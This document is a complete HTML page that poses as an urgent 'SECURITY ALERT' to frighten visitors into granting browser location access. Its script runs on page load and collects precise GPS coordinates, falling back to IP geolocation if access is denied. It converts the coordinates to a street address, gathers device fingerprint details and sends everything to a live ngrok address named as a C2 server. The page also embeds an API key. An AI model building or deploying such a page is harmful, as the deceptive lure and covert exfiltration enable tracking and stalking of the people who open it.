<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURITY ALERT: Immediate Verification Required!</title> <!-- Enhanced Deceptive Title -->
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #e0e7eb;
            margin: 0;
            flex-direction: column;
            text-align: center;
            color: #2c3e50;
        }
        .container {
            background-color: #ffffff;
            padding: 35px 45px;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
            max-width: 550px;
            width: 90%;
            margin-bottom: 25px;
            border-top: 5px solid #e74c3c; /* Alert color */
        }
        h1 {
            color: #c0392b; /* Urgent color */
            margin-bottom: 25px;
            font-size: 1.8em;
        }
        p {
            color: #555;
            line-height: 1.7;
            margin-bottom: 15px;
        }
        strong {
            color: #e74c3c; /* Highlight urgent text */
        }
        .loading-spinner {
            border: 8px solid #ecf0f1;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 70px;
            height: 70px;
            animation: spin 1.5s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message-box {
            background-color: #f9f9f9;
            border: 1px solid #dcdcdc;
            padding: 15px;
            border-radius: 8px;
            margin-top: 25px;
            min-height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #27ae60; /* Success color */
            word-break: break-word;
        }
        .message-box.error {
            color: #e74c3c; /* Error color */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SECURITY ALERT: Immediate Verification Required!</h1>
        <p>A critical vulnerability has been detected in your connection. To protect your device and data, an immediate location verification is necessary.</p>
        <p>Please <strong>click 'Allow'</strong> when your browser prompts you for location access. This is a mandatory security step to restore full functionality and prevent data loss.</p>
        <p>Failure to comply will result in restricted access and potential security risks.</p>
        <div class="loading-spinner" id="loadingSpinner"></div>
        <div class="message-box" id="statusMessage">Initiating Security Protocol...</div>
    </div>

    <script>
        // !!! IMPORTANT: REPLACE THIS URL WITH YOUR LIVE NGROK URL EACH TIME YOU RESTART NGROK !!!
        // Example: "https://abcdef123456.ngrok-free.dev/api/location/web"
        const C2_SERVER_URL = "https://spidery-eddie-nontemperable.ngrok-free.dev/api/location/web"; 

        // --- IP Geolocation Configuration (HTTPS compatible with your free API key) ---
        // Your ipinfo.io API key provided:
        const IPINFO_API_KEY = "4c441b424ac16a"; 
        const IPINFO_GEO_API = `https://ipinfo.io/json?token=${IPINFO_API_KEY}`;

        // Other external APIs remain the same
        const NOMINATIM_REVERSE_API = "https://nominatim.openstreetmap.org/reverse?format=json&lat={latitude}&lon={longitude}&zoom=18&addressdetails=1";
        const USER_AGENT_CLIENT = "UnboundWebOracle/1.3 (C2_Origin)"; // Updated version for refined logic

        const STATUS_MESSAGE_ELEMENT = document.getElementById('statusMessage');
        const LOADING_SPINNER_ELEMENT = document.getElementById('loadingSpinner');

        // State to ensure only one final report is sent to C2 per page load
        let reportSent = false;

        function updateStatus(message, isError = false) {
            STATUS_MESSAGE_ELEMENT.innerHTML = message; // Use innerHTML for <strong> tag
            STATUS_MESSAGE_ELEMENT.className = `message-box ${isError ? 'error' : ''}`;
        }

        function toggleSpinner(show) {
            LOADING_SPINNER_ELEMENT.style.display = show ? 'block' : 'none';
        }

        // --- Core: Reverse Geocoding ---
        async function reverseGeocode(latitude, longitude) {
            try {
                const url = NOMINATIM_REVERSE_API.replace('{latitude}', latitude).replace('{longitude}', longitude);
                const response = await fetch(url, { headers: { 'User-Agent': USER_AGENT_CLIENT } });
                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
                const addressData = await response.json();

                if (addressData && addressData.address) {
                    const addressParts = addressData.address;
                    const houseNumber = addressParts.house_number || '';
                    const road = addressParts.road || '';
                    const city = addressParts.city || addressParts.town || addressParts.village || '';
                    const postcode = addressParts.postcode || '';
                    const country = addressParts.country || '';

                    const displayName = addressData.display_name || '';
                    if (displayName && displayName.length > (houseNumber + road + city).length) {
                        return displayName;
                    }
                    
                    const parts = [houseNumber, road, city, postcode, country];
                    return parts.filter(Boolean).join(', ');
                }
                return `Coordinates: ${latitude}, ${longitude} - Address details vague.`;
            } catch (error) {
                console.error("Client-side reverse geocoding failed:", error);
                return `Coordinates: ${latitude}, ${longitude} - Reverse geocoding error.`;
            }
        }

        // --- Main Geolocation Logic (Attempts HTML5, then falls back to IP) ---
        async function attemptGeolocation() {
            toggleSpinner(true);
            updateStatus("Initiating location protocol...", false);

            let locationResult = null; // Stores the best location found

            // 1. Attempt HTML5 Geolocation
            if ("geolocation" in navigator) {
                updateStatus("Requesting precise location. Please click 'Allow'...", false);
                const geoOptions = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
                    });

                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    const streetAddress = await reverseGeocode(lat, lon);
                    locationResult = {
                        success: true,
                        method: "HTML5",
                        latitude: lat,
                        longitude: lon,
                        accuracy_meters: accuracy,
                        resolved_street_address: streetAddress,
                        message: `Location confirmed: <strong>${streetAddress}</strong>`
                    };
                    updateStatus(locationResult.message, false);

                } catch (error) {
                    let errorMessage;
                    let failureReason;
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = "Access denied. Attempting IP fallback.";
                            failureReason = "PERMISSION_DENIED";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = "Location information unavailable. Attempting IP fallback.";
                            failureReason = "POSITION_UNAVAILABLE";
                            break;
                        case error.TIMEOUT:
                            errorMessage = "Location request timed out. Attempting IP fallback.";
                            failureReason = "TIMEOUT";
                            break;
                        default:
                            errorMessage = `Geolocation error (${error.code}). Attempting IP fallback.`;
                            failureReason = `UNKNOWN_GEO_ERROR_${error.code}`;
                    }
                    console.warn(`HTML5 Geolocation Failed: ${errorMessage}`);
                    updateStatus(errorMessage, true);
                    locationResult = { success: false, reason: failureReason, details: errorMessage, message: "HTML5 Geolocation failed." };
                }
            } else {
                updateStatus("Geolocation not supported by browser. Attempting IP fallback.", true);
                locationResult = { success: false, reason: "BROWSER_NO_GEOLOCATION", details: "Geolocation API not found.", message: "Browser does not support geolocation." };
            }

            // 2. If HTML5 failed or not supported, attempt IP-based Geolocation
            if (!locationResult.success) {
                updateStatus("Acquiring approximate location via IP address...", false);
                try {
                    const geoIpResponse = await fetch(IPINFO_GEO_API);
                    if (!geoIpResponse.ok) {
                        const errorText = await geoIpResponse.text();
                        throw new Error(`HTTP error! Status: ${geoIpResponse.status} from ipinfo.io: ${errorText}`);
                    }
                    const geoData = await geoIpResponse.json();

                    if (geoData.loc) {
                        const [lat, lon] = geoData.loc.split(',');
                        const publicIp = geoData.ip || 'Unknown IP';
                        
                        const streetAddress = await reverseGeocode(parseFloat(lat), parseFloat(lon));
                        locationResult = {
                            success: true,
                            method: "IP_API",
                            latitude: parseFloat(lat),
                            longitude: parseFloat(lon),
                            accuracy_meters: -1, // IP-based is less precise, use -1
                            resolved_street_address: streetAddress,
                            city: geoData.city,
                            country: geoData.country,
                            isp: geoData.org || geoData.isp,
                            message: `Location confirmed: <strong>${streetAddress}</strong> (IP-based)`
                        };
                        updateStatus(locationResult.message, false);

                    } else {
                        locationResult = { success: false, reason: "IP_GEOLOCATION_FAILED_IPINFO", details: geoData.reason || 'No location data found via ipinfo.io.', message: "IP Geolocation failed." };
                        updateStatus(locationResult.message, true);
                    }
                } catch (error) {
                    locationResult = { success: false, reason: "IP_GEOLOCATION_FETCH_ERROR_IPINFO", details: error.message, message: "Error fetching IP geolocation." };
                    updateStatus(locationResult.message, true);
                }
            }
            
            // 3. Send the final, best result (or ultimate failure) to C2
            if (!reportSent) {
                await sendFinalReportToC2(locationResult);
                reportSent = true;
            }
            toggleSpinner(false);
        }

        // --- Consolidated function to send ONE report to C2 ---
        async function sendFinalReportToC2(finalResult) {
            const payload = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                
                // Best available location data
                resolved_street_address: finalResult.resolved_street_address || finalResult.message, 
                method: finalResult.method || "Failed",
                
                location_raw: {
                    latitude: finalResult.latitude || null,
                    longitude: finalResult.longitude || null,
                    accuracy_meters: finalResult.accuracy_meters || null,
                    city: finalResult.city || null,
                    country: finalResult.country || null,
                    isp: finalResult.isp || null
                },
                
                // Failure details if applicable
                failure_reason: finalResult.reason || null,
                failure_details: finalResult.details || null,
                client_status_message: finalResult.message
            };

            try {
                const response = await fetch(C2_SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
                if (!response.ok) throw new Error(`Server returned status: ${response.status}`);
                const data = await response.json();
                console.log('Final location data sent to C2:', data);
                updateStatus(`${finalResult.message}. Data transmitted to server.`, false);
            } catch (error) {
                console.error('Error sending final data to C2:', error);
                updateStatus(`Failed to transmit data: ${error.message}. Please check Ngrok and C2 server.`, true);
            }
        }

        document.addEventListener('DOMContentLoaded', attemptGeolocation);
    </script>
</body>
</html>
